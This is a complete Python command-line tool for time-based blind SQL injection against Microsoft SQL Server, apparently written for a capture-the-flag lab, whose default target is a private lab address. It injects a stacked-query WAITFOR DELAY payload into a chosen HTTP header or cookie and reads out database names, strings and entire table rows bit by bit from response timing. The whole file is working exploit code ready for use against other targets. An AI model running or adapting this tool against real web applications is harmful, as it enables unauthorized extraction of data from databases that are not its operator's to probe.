#!/usr/bin/python3

import argparse
import requests
import sys
import time
from urllib.parse import quote as urlquote


# ── Pretty printing ──────────────────────────────────────────
# Status goes to stderr so stdout only has the extracted value.
# Colors auto-disable when stderr is piped to a file.

USE_COLOR = sys.stderr.isatty()


def colorize(code, text):
    if USE_COLOR:
        return f"\033[{code}m{text}\033[0m"
    return text


def info(message):
    print(colorize("1;34", f"[*] {message}"), file=sys.stderr)


def success(message):
    print(colorize("1;32", f"[+] {message}"), file=sys.stderr)


def error(message):
    print(colorize("1;31", f"[-] {message}"), file=sys.stderr)
    sys.exit(1)


def print_banner(title):
    line = "=" * 50
    print(colorize("1;35", line), file=sys.stderr)
    print(colorize("1;35", f"  {title}"), file=sys.stderr)
    print(colorize("1;35", line), file=sys.stderr)


# ── CLI arguments ────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="Time-based blind SQLi via bitwise extraction"
    )
    parser.add_argument("-u", "--url",
                        default="http://10.129.204.197:8080/",
                        help="Target URL")
    parser.add_argument("-d", "--delay",
                        type=float, default=2,
                        help="WAITFOR DELAY threshold in seconds")
    parser.add_argument("-q", "--query",
                        required=True,
                        help="SQL expression to extract (e.g. DB_NAME())")
    parser.add_argument("-m", "--mode",
                        choices=["number", "string", "enum"], default="string",
                        help="Extraction mode (enum: enumerate all rows from a single-column query)")
    parser.add_argument("--length",
                        type=int, default=None,
                        help="Skip length detection, use this value")
    parser.add_argument("--header",
                        default="User-Agent",
                        help="Header to inject into (default: User-Agent)")
    parser.add_argument("--prefix",
                        default="",
                        help="Value prefix before the payload (e.g. cookie base value)")
    parser.add_argument("--extra-cookies",
                        default="",
                        help="Additional cookies to include (e.g. 'PHPSESSID=abc123')")
    parser.add_argument("--bits",
                        type=int, default=7,
                        help="Bits per value (default: 7)")
    return parser.parse_args()


# ── Extraction logic (oracle-agnostic) ───────────────────────

def validate_oracle(oracle, delay):
    """
    Send two known queries and time them. The TRUE query should
    take longer than `delay` seconds; the FALSE query should not.
    """
    info(f"Validating oracle (this takes ~{2 * delay:.0f}s)...")

    before = time.time()
    true_result = oracle("1=1")
    true_elapsed = time.time() - before

    before = time.time()
    false_result = oracle("1=0")
    false_elapsed = time.time() - before

    info(f"TRUE  probe: {true_elapsed:.2f}s (threshold: {delay}s)")
    info(f"FALSE probe: {false_elapsed:.2f}s (threshold: {delay}s)")

    if not true_result:
        error("Oracle check failed: 1=1 returned FALSE")

    if false_result:
        error("Oracle check failed: 1=0 returned TRUE")

    success("Oracle OK: 1=1 -> TRUE, 1=0 -> FALSE")


def dump_number(oracle, query, bits=7):
    """
    Extract a number by testing each bit individually.
    Bit 0 (value 1), bit 1 (value 2), bit 2 (value 4), etc.
    If the bit is set in the server's answer, we set it in ours.
    """
    value = 0

    for bit_position in range(bits):
        bit_value = 2 ** bit_position

        if oracle(f"({query})&{bit_value}>0"):
            value |= bit_value

        # Show the binary value building up in real time
        print(
            colorize("1;34", f"\r[*] Bits: {value:0{bits}b} = {value}"),
            end="",
            file=sys.stderr,
        )

    print(file=sys.stderr)  # finish the \r line
    success(f"Number = {value}")
    return value


def dump_string(oracle, query, length, bits=7):
    """
    Extract a string character by character. For each character,
    we extract its ASCII code using the same bitwise approach
    as dump_number, then convert it to a character.
    """
    result = ""

    for position in range(1, length + 1):
        ascii_code = 0

        for bit_position in range(bits):
            bit_value = 2 ** bit_position
            condition = f"ASCII(SUBSTRING(({query}),{position},1))&{bit_value}>0"

            if oracle(condition):
                ascii_code |= bit_value

        character = chr(ascii_code)
        result += character

        # Show the character on stdout (for piping)
        print(character, end="", flush=True)

        # Show progress on stderr
        print(
            colorize("1;34", f"\r[*] Extracting [{position}/{length}] {result}"),
            end="",
            file=sys.stderr,
        )

    print(file=sys.stderr)  # finish the \r line
    print()                  # finish the stdout line
    return result


def dump_rows(oracle, query, bits=7, known_count=None):
    """
    Enumerate all rows from a single-column query.
    Wraps the query with OFFSET/FETCH to iterate each row.
    """
    if known_count is not None:
        count = known_count
        info(f"Using provided row count: {count}")
    else:
        info("Counting rows...")
        count_query = f"SELECT COUNT(*) FROM ({query}) AS _t(_c)"
        count = dump_number(oracle, count_query, bits)

    if count == 0:
        info("No rows found.")
        return []

    success(f"Found {count} rows")
    rows = []

    for i in range(count):
        row_query = f"{query} ORDER BY 1 OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY"

        info(f"Row [{i + 1}/{count}] — detecting length...")
        length = dump_number(oracle, f"LEN(({row_query}))", bits)

        info(f"Row [{i + 1}/{count}] — extracting {length} chars...")
        value = dump_string(oracle, row_query, length, bits)
        rows.append(value)
        success(f"Row [{i + 1}/{count}] = {value}")

    return rows


# ── Main ─────────────────────────────────────────────────────

def main():
    args = parse_args()

    print_banner("Time-Based Blind SQLi (Bitwise)")
    info(f"URL:   {args.url}")
    info(f"Delay: {args.delay}s")
    info(f"Mode:  {args.mode}")
    info(f"Query: {args.query}")
    print(file=sys.stderr)

    # Track how many HTTP requests we send
    request_count = 0
    start_time = time.time()

    # ── Build the oracle ──
    inject_cookie = args.header.lower() == "cookie"

    def oracle(condition):
        nonlocal request_count
        request_count += 1

        payload = f"';IF({condition}) WAITFOR DELAY '0:0:{int(args.delay)}'--"

        if inject_cookie:
            encoded_payload = urlquote(payload, safe="")
            cookie_value = f"{args.prefix}{encoded_payload}"
            if args.extra_cookies:
                headers = {"Cookie": f"{args.extra_cookies}; {cookie_value}"}
            else:
                headers = {"Cookie": cookie_value}
        else:
            header_value = args.prefix + payload
            headers = {args.header: header_value}
            if args.extra_cookies:
                headers["Cookie"] = args.extra_cookies

        before = time.time()
        requests.get(args.url, headers=headers)
        elapsed = time.time() - before

        return elapsed > args.delay

    # ── Run ──
    validate_oracle(oracle, args.delay)

    if args.mode == "number":
        result = dump_number(oracle, args.query, args.bits)
    elif args.mode == "enum":
        rows = dump_rows(oracle, args.query, args.bits, args.length)
        result = ", ".join(rows)
    else:
        if args.length is not None:
            length = args.length
            info(f"Using provided length: {length}")
        else:
            info("Detecting length...")
            length = dump_number(oracle, f"LEN(({args.query}))", args.bits)

        result = dump_string(oracle, args.query, length, args.bits)

    elapsed = time.time() - start_time
    print(file=sys.stderr)
    success(f"Result: {result}")
    success(f"Done in {elapsed:.1f}s ({request_count} requests)")


if __name__ == "__main__":
    main()

